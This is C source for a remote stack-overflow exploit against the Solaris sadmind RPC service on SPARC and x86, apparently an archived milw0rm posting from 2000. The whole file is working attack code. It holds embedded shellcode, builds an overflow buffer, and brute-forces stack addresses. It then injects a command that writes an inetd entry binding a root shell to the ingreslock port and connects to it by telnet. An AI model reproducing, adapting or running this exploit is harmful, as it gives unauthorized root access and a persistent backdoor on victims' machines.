/*************************************************************************\
**                                                                       **
**    Super Solaris sadmin Exploit by optyx <optyx@uberhax0r.net>        **
**    based on sadminsparc. and sadminx86.c by Cheez Whiz                **
**                                                                       **
\*************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <rpc/rpc.h>

char shellsparc[] =
  "\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff"
  "\x90\x03\xe0\x5c\x92\x22\x20\x10\x94\x1b\xc0\x0f"
  "\xec\x02\x3f\xf0\xac\x22\x80\x16\xae\x02\x60\x10"
  "\xee\x22\x3f\xf0\xae\x05\xe0\x08\xc0\x2d\xff\xff"
  "\xee\x22\x3f\xf4\xae\x05\xe0\x03\xc0\x2d\xff\xff"
  "\xee\x22\x3f\xf8\xae\x05\xc0\x16\xc0\x2d\xff\xff"
  "\xc0\x22\x3f\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
  "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
  "\xff\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\xff"
  "\x2d\x63\xff";

char shellx86[] =
  "\xeb\x45\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31"
  "\xc0\x89\x46\xb7\x88\x46\xbc\x31\xc0\x50\x56\x8b"
  "\x1e\xf7\xdb\x89\xf7\x83\xc7\x10\x57\x89\x3e\x83"
  "\xc7\x08\x88\x47\xff\x89\x7e\x04\x83\xc7\x03\x88"
  "\x47\xff\x89\x7e\x08\x01\xdf\x88\x47\xff\x89\x46"
  "\x0c\xb0\x3b\xe8\xbe\xff\xff\xff\x83\xc4\x0c\xe8"
  "\xbe\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
  "\xff\xff\xff\xff\xff\xff\xff\xff\x2f\x62\x69\x6e"
  "\x2f\x73\x68\xff\x2d\x63\xff";
           

int buflen[]      = { 1076, 1056 };
int addrlen[]     = { 560, 8 };
int lens[]        = { 84, 76 };
int offset[]      = { 688, 572 };
int alignment[]   = { 4, 0 };
long int nops[]   = { 0x801bc00f, 0x90 };
int junks[]       = { 512, 536 };
char command[]    = "echo 'ingreslock stream tcp nowait root /bin/sh sh -i' "
             	  "> /tmp/.x; /usr/sbin/inetd -s /tmp/.x; rm -f /tmp/.x;";

unsigned long int sp[]  = { 0xefff9580, 0xefff9418, 0x080418ec, 0x08041798 };
 
#define FRAMELEN1 608
#define FRAMELEN2 4200

#define NETMGT_PROG 100232
#define NETMGT_VERS 10
#define NETMGT_PROC_PING 0
#define NETMGT_PROC_SERVICE 1

#define NETMGT_UDP_PING_TIMEOUT 30
#define NETMGT_UDP_PING_RETRY_TIMEOUT 5
#define NETMGT_UDP_SERVICE_TIMEOUT 1
#define NETMGT_UDP_SERVICE_RETRY_TIMEOUT 2

#define NETMGT_HEADER_TYPE 6
#define NETMGT_ARG_INT 3
#define NETMGT_ARG_STRING 9
#define NETMGT_ENDOFARGS "netmgt_endofargs"

#define FW_VERSION "VERSION"
#define CLIENT_DOMAIN "CLIENT_DOMAIN"
#define FENCE "FENCE"

struct nm_send_header {
  struct timeval timeval1;
  struct timeval timeval2;
  struct timeval timeval3;
  unsigned int uint1;
  unsigned int uint2;
  unsigned int uint3;
  unsigned int uint4;
  unsigned int uint5;
  struct in_addr inaddr1;
  struct in_addr inaddr2;
  unsigned long ulong1;
  unsigned long ulong2;
  struct in_addr inaddr3;
  unsigned long ulong3;
  unsigned long ulong4;
  unsigned long ulong5;
  struct timeval timeval4;
  unsigned int uint6;
  struct timeval timeval5;
  char *string1;
  char *string2;
  char *string3;
  unsigned int uint7;
};

struct nm_send_arg_int {
  char *string1;
  unsigned int uint1;
  unsigned int uint2;
  int int1;
  unsigned int uint3;
  unsigned int uint4;
};

struct nm_send_arg_string {
  char *string1;
  unsigned int uint1;
  unsigned int uint2;
  char *string2;
  unsigned int uint3;
  unsigned int uint4;
};

struct nm_send_footer {
  char *string1;
};

struct nm_send {
  struct nm_send_header header;
  struct nm_send_arg_int version;
  struct nm_send_arg_string string;
  struct nm_send_arg_int fence;
  struct nm_send_footer footer;
};

struct nm_reply {
  unsigned int uint1;
  unsigned int uint2;
  char *string1;
};

bool_t xdr_nm_send_header(XDR *xdrs, struct nm_send_header *objp)
{
  char *addr;
  size_t size = sizeof(struct in_addr);

  if(!xdr_long(xdrs, &objp->timeval1.tv_sec))
    return (FALSE);
  if(!xdr_long(xdrs, &objp->timeval1.tv_usec))
    return (FALSE);
  if(!xdr_long(xdrs, &objp->timeval2.tv_sec))
    return (FALSE);
  if(!xdr_long(xdrs, &objp->timeval2.tv_usec))
    return (FALSE);
  if(!xdr_long(xdrs, &objp->timeval3.tv_sec))
    return (FALSE);
  if(!xdr_long(xdrs, &objp->timeval3.tv_usec))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint1))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint2))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint3))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint4))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint5))
    return (FALSE);
  addr = (char *) &objp->inaddr1.s_addr;
  if(!xdr_bytes(xdrs, &addr, &size, size))
    return (FALSE);
  if(!xdr_u_long(xdrs, &objp->ulong1))
    return (FALSE);
  if(!xdr_u_long(xdrs, &objp->ulong2))
    return (FALSE);
  if(!xdr_u_long(xdrs, &objp->ulong3))
    return (FALSE);
  if(!xdr_u_long(xdrs, &objp->ulong4))
    return (FALSE);
  if(!xdr_u_long(xdrs, &objp->ulong5))
    return (FALSE);
  if(!xdr_long(xdrs, &objp->timeval4.tv_sec))
    return (FALSE);
  if(!xdr_long(xdrs, &objp->timeval4.tv_usec))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint6))
    return (FALSE);
  if(!xdr_long(xdrs, &objp->timeval5.tv_sec))
    return (FALSE);
  if(!xdr_long(xdrs, &objp->timeval5.tv_usec))
    return (FALSE);
  if(!xdr_wrapstring(xdrs, &objp->string1))
    return (FALSE);
  if(!xdr_wrapstring(xdrs, &objp->string2))
    return (FALSE);
  if(!xdr_wrapstring(xdrs, &objp->string3))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint7))
    return (FALSE);
  return (TRUE);
}

bool_t xdr_nm_send_arg_int(XDR *xdrs, struct nm_send_arg_int *objp)
{
  if(!xdr_wrapstring(xdrs, &objp->string1))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint1))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint2))
    return (FALSE);
  if(!xdr_int(xdrs, &objp->int1))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint3))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint4))
    return (FALSE);
  return (TRUE);
}

bool_t xdr_nm_send_arg_string(XDR *xdrs, struct nm_send_arg_string *objp)
{
  if(!xdr_wrapstring(xdrs, &objp->string1))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint1))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint2))
    return (FALSE);
  if(!xdr_wrapstring(xdrs, &objp->string2))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint3))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint4))
    return (FALSE);
  return (TRUE);
}

bool_t xdr_nm_send_footer(XDR *xdrs, struct nm_send_footer *objp)
{
  if(!xdr_wrapstring(xdrs, &objp->string1))
    return (FALSE);
  return (TRUE);
}

bool_t xdr_nm_send(XDR *xdrs, struct nm_send *objp)
{
  if(!xdr_nm_send_header(xdrs, &objp->header))
    return (FALSE);
  if(!xdr_nm_send_arg_int(xdrs, &objp->version))
    return (FALSE);
  if(!xdr_nm_send_arg_string(xdrs, &objp->string))
    return (FALSE);
  if(!xdr_nm_send_arg_int(xdrs, &objp->fence))
    return (FALSE);
  if(!xdr_nm_send_footer(xdrs, &objp->footer))
    return (FALSE);
  return (TRUE);
}

bool_t xdr_nm_reply(XDR *xdrs, struct nm_reply *objp)
{
  if(!xdr_u_int(xdrs, &objp->uint1))
    return (FALSE);
  if(!xdr_u_int(xdrs, &objp->uint2))
    return (FALSE);
  if(!xdr_wrapstring(xdrs, &objp->string1))
    return (FALSE);
  return (TRUE);
}

void usage(char *prog)
{
  fprintf(stderr, "usage: %s -t target -a arch [-s size]", prog);
  fprintf(stderr, " [-i increment] [-p]\n");
  fprintf(stderr, "\tarchitectures:\n");
  fprintf(stderr, "\t0 - Solaris SPARC 2.6\n");
  fprintf(stderr, "\t1 - Solaris SPARC 2.7 (7.0)\n");
  fprintf(stderr, "\t2 - Solaris x86   2.6\n");
  fprintf(stderr, "\t3 - Solaris x86   2.7 (7.0)\n\n");

  exit(-1);  
}

int exp(char *host, int arch, unsigned long int sp, int pinging)
{
  CLIENT *cl;
  struct nm_send send;
  struct nm_reply reply;
  struct timeval tm;
  enum clnt_stat stat;
  int c, i, len, slen, clen, junk, a;
  char *cp, *buf;
  unsigned long int addr, fp;
  
  a = (int) arch / 2;  
  buf = (char *) malloc(buflen[a] + 1);

  if(a)
  {
    /* Solaris x86 */
    memset(buf, nops[a], buflen[a]);
    junk = junks[arch - 2];
    junk &= 0xfffffffc;

    for (i = 0, cp = buf + alignment[a]; i < junk / 4; i++) 
    {
      *cp++ = (sp >>  0) & 0xff;
      *cp++ = (sp >>  8) & 0xff;
      *cp++ = (sp >> 16) & 0xff;
      *cp++ = (sp >> 24) & 0xff;
    }

    addr = sp + offset[a];

    for (i = 0; i < addrlen[a] / 4; i++) 
    {
      *cp++ = (addr >>  0) & 0xff;
      *cp++ = (addr >>  8) & 0xff;
      *cp++ = (addr >> 16) & 0xff;
      *cp++ = (addr >> 24) & 0xff;
    }

    slen = strlen(shellx86); 
    clen = strlen(command);
    len = clen; 
    len++; 
    len = -len;
    shellx86[lens[a]+0] = (len >>  0) & 0xff;
    shellx86[lens[a]+1] = (len >>  8) & 0xff;
    shellx86[lens[a]+2] = (len >> 16) & 0xff;
    shellx86[lens[a]+3] = (len >> 24) & 0xff;
    cp = buf + buflen[a] - 1 - clen - slen;
    memcpy(cp, shellx86, slen); 
    cp += slen;
    memcpy(cp, command, clen); 
    cp += clen;
    *cp = '\xff';
  }
  else
  {
    /* Solaris SPARC */
    memset(buf, '\xff', buflen[a]);
    fp = sp + FRAMELEN1 + FRAMELEN2;
    fp &= 0xfffffff8;
    addr = sp + offset[a];
    addr &= 0xfffffffc;

    for(i = 0, cp = buf + alignment[a]; i < addrlen[a] / 8; i++)
    {
      *cp++ = (fp >> 24) & 0xff;
      *cp++ = (fp >> 16) & 0xff;
      *cp++ = (fp >>  8) & 0xff;
      *cp++ = (fp >>  0) & 0xff;
      *cp++ = (addr >> 24) & 0xff;
      *cp++ = (addr >> 16) & 0xff;
      *cp++ = (addr >>  8) & 0xff;
      *cp++ = (addr >>  0) & 0xff;
    }
    
    slen = strlen(shellsparc);
    clen = strlen(command);
    len = buflen[a] - 1 - clen - slen - addrlen[a] - alignment[a];
    len &= 0xfffffffc;
    for(i = 0; i < lens[a] / 4; i++)
    {
      *cp++ = (nops[a] >> 24) & 0xff;
      *cp++ = (nops[a] >> 16) & 0xff;
      *cp++ = (nops[a] >>  8) & 0xff;
      *cp++ = (nops[a] >>  0) & 0xff;
    }
    len = clen;
    len++;
    len = -len;
    shellsparc[lens[a]+0] = (len >> 24) & 0xff;
    shellsparc[lens[a]+1] = (len >> 16) & 0xff;
    shellsparc[lens[a]+2] = (len >>  8) & 0xff;
    shellsparc[lens[a]+3] = (len >>  0) & 0xff;
    memcpy(cp, shellsparc, slen);
    cp += slen;
    memcpy(cp, command, clen);
  }

  buf[buflen[a]] = '\0';
  memset(&send, 0, sizeof(struct nm_send));
  send.header.uint2 = NETMGT_HEADER_TYPE;
  send.header.string1 = "";
  send.header.string2 = "";
  send.header.string3 = "";
  send.header.uint7 =
    strlen(FW_VERSION) + 1 +
    (4 * sizeof(unsigned int)) + sizeof(int) +
    strlen(CLIENT_DOMAIN) + 1 +
    (4 * sizeof(unsigned int)) + strlen(buf) + 1 +
    strlen(FENCE) + 1 +
    (4 * sizeof(unsigned int)) + sizeof(int) +
    strlen(NETMGT_ENDOFARGS) + 1;
  send.version.string1 = FW_VERSION;
  send.version.uint1 = NETMGT_ARG_INT;
  send.version.uint2 = sizeof(int);
  send.version.int1 = 1;
  send.string.string1 = CLIENT_DOMAIN;
  send.string.uint1 = NETMGT_ARG_STRING;
  send.string.uint2 = strlen(buf);
  send.string.string2 = buf;
  send.fence.string1 = FENCE;
  send.fence.uint1 = NETMGT_ARG_INT;
  send.fence.uint2 = sizeof(int);
  send.fence.int1 = 666;
  send.footer.string1 = NETMGT_ENDOFARGS;
  cl = clnt_create(host, NETMGT_PROG, NETMGT_VERS, "udp");

  if (cl == NULL) 
  {
    clnt_pcreateerror("clnt_create");
    return 0;
  }

  cl->cl_auth = authunix_create("localhost", 0, 0, 0, NULL);

  if (!pinging) 
  {
    tm.tv_sec = NETMGT_UDP_SERVICE_TIMEOUT; 
    tm.tv_usec = 0;

    if (!clnt_control(cl, CLSET_TIMEOUT, (char *) &tm)) 
    {
      fprintf(stderr, "unable to set timeout\n");
      exit(1);
    }

    tm.tv_sec = NETMGT_UDP_SERVICE_RETRY_TIMEOUT; 
    tm.tv_usec = 0;

    if (!clnt_control(cl, CLSET_RETRY_TIMEOUT, (char *) &tm)) 
    {
      fprintf(stderr, "unable to set timeout\n");
      exit(1);
    }

    stat = clnt_call(cl, NETMGT_PROC_SERVICE,
      xdr_nm_send, (caddr_t) &send,
      xdr_nm_reply, (caddr_t) &reply, tm);

    if (stat != RPC_SUCCESS) 
    {
      clnt_perror(cl, "clnt_call");
      fprintf(stdout, "now check if exploit worked;\n");
      return 0;
    }

    fprintf(stderr, "exploit failed; "
      "RPC succeeded and returned { %u, %u, \"%s\" }\n",
      reply.uint1, reply.uint2, reply.string1);
    clnt_destroy(cl);
    exit(1);
  } 
  else 
  {

    tm.tv_sec = NETMGT_UDP_PING_TIMEOUT; 
    tm.tv_usec = 0;

    if (!clnt_control(cl, CLSET_TIMEOUT, (char *) &tm)) 
    {
      fprintf(stderr, "unable to set timeout\n");
      exit(1);
    }

    tm.tv_sec = NETMGT_UDP_PING_RETRY_TIMEOUT; 
    tm.tv_usec = 0;

    if (!clnt_control(cl, CLSET_RETRY_TIMEOUT, (char *) &tm)) 
    {
      fprintf(stderr, "unable to set timeout\n");
      exit(1);
    }

    stat = clnt_call(cl, NETMGT_PROC_PING,
      xdr_void, NULL,
      xdr_void, NULL, tm);

    if (stat != RPC_SUCCESS) 
    {
      clnt_perror(cl, "clnt_call");
      exit(1);
    }

    clnt_destroy(cl);
    return 0;
  }
}

int main(int argc, char *argv[])
{
  int i, arch;
  char *host = "";
  int pinging = 0, inc = 4, size = 2048;
  unsigned long int addr;

  for(i=0;i<argc;i++)
  {
    if(!strcmp(argv[i], "-t"))
      host = argv[i+1];  
    if(!strcmp(argv[i], "-a"))
      arch = atoi(argv[i+1]);
    if(!strcmp(argv[i], "-i"))
      inc = atoi(argv[i+1]);
    if(!strcmp(argv[i], "-s"))
      size = atoi(argv[i+1]);  
    if(!strcmp(argv[i], "-p"))
      pinging = 1;
  }

  if(arch > 3 || arch < 0)
    usage(argv[0]);
  if(size < 0)
    usage(argv[0]);
  if(inc < 0)
    usage(argv[0]);

  for(i = 0; i < size; i+=inc)
  {
    addr = sp[arch] + i;
    exp(host, arch, addr, pinging); 
    addr = sp[arch] - i;
    exp(host, arch, addr, pinging);
  }

  execl("telnet", host, "ingreslock");
  return 0;
}


// milw0rm.com [2000-12-01]
